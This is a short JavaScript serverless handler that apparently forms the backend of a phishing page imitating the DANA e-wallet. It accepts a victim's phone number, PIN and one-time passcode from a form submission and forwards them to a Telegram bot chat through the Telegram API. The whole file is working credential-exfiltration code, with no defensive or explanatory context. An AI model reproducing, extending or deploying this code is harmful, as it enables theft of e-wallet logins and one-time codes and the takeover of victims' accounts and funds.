export default async function handler(req, res) {
  const token = process.env.BOT_TOKEN;
  const chat_id = process.env.CHAT_ID;

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { nomor, pin, otp } = req.body;

  let text = `📩 NOTIF DANA\n\n`;
  text += `📱 Nomor: ${nomor}\n`;

  if (pin) text += `🔑 PIN: ${pin}\n`;
  if (otp) text += `🔐 OTP: ${otp}\n`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chat_id,
        text: text,
      }),
    });

    return res.status(200).json({ status: 'success' });
  } catch (err) {
    return res.status(500).json({ status: 'error' });
  }
}
